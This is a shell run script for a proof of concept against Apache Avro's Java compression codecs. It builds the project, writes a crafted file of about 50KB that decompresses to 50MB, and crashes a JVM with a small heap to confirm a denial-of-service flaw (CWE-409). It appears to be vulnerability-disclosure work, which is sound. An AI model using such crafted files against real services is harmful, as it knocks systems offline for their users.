#!/usr/bin/env bash
#
# Avro Decompression Bomb PoC - Run Script
#
# Demonstrates CWE-409 in Apache Avro Java codec layer.
# All compression codecs decompress into unbounded ByteArrayOutputStream,
# allowing a ~50KB crafted file to cause OutOfMemoryError.
#
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
JAR="$SCRIPT_DIR/target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar"
POC_FILE="$SCRIPT_DIR/poc.avro"

echo "============================================="
echo " Avro Decompression Bomb PoC (CWE-409)"
echo "============================================="
echo

# Step 0: Build
if [ ! -f "$JAR" ]; then
    echo "[*] Building project..."
    mvn -f "$SCRIPT_DIR/pom.xml" -q package -DskipTests
    echo "[+] Build complete."
    echo
fi

# Step 1: Create the malicious Avro file (needs large heap to write the 50MB payload)
echo "[*] Step 1: Creating malicious Avro file..."
echo
java -Xmx256m -cp "$JAR" poc.CreatePoC "$POC_FILE"
echo

# Step 2: Attempt to read it with a small heap (32MB)
echo "============================================="
echo "[*] Step 2: Triggering OOM with -Xmx32m..."
echo "============================================="
echo

# We expect this to fail with OOM (exit code 99), so disable set -e temporarily
set +e
java -Xmx32m -cp "$JAR" poc.TriggerOOM "$POC_FILE"
EXIT_CODE=$?
set -e

echo
if [ $EXIT_CODE -eq 99 ]; then
    echo "============================================="
    echo " RESULT: VULNERABILITY CONFIRMED (exit=99)"
    echo "============================================="
    echo
    echo "The Avro DeflateCodec.decompress() method decompresses"
    echo "data into an unbounded ByteArrayOutputStream. A crafted"
    echo "~50KB file expanded to 50MB during decompression, causing"
    echo "OutOfMemoryError and crashing the JVM."
    echo
    echo "Affected codecs: Deflate, Zstandard, BZip2, Snappy, XZ"
    echo "CWE: CWE-409 (Improper Handling of Highly Compressed Data)"
    echo "Impact: Denial of Service (DoS)"
elif [ $EXIT_CODE -eq 0 ]; then
    echo "============================================="
    echo " RESULT: OOM not triggered (heap was enough)"
    echo "============================================="
    echo "Try running with a smaller -Xmx value."
else
    echo "============================================="
    echo " RESULT: Unexpected exit code: $EXIT_CODE"
    echo "============================================="
fi

exit $EXIT_CODE
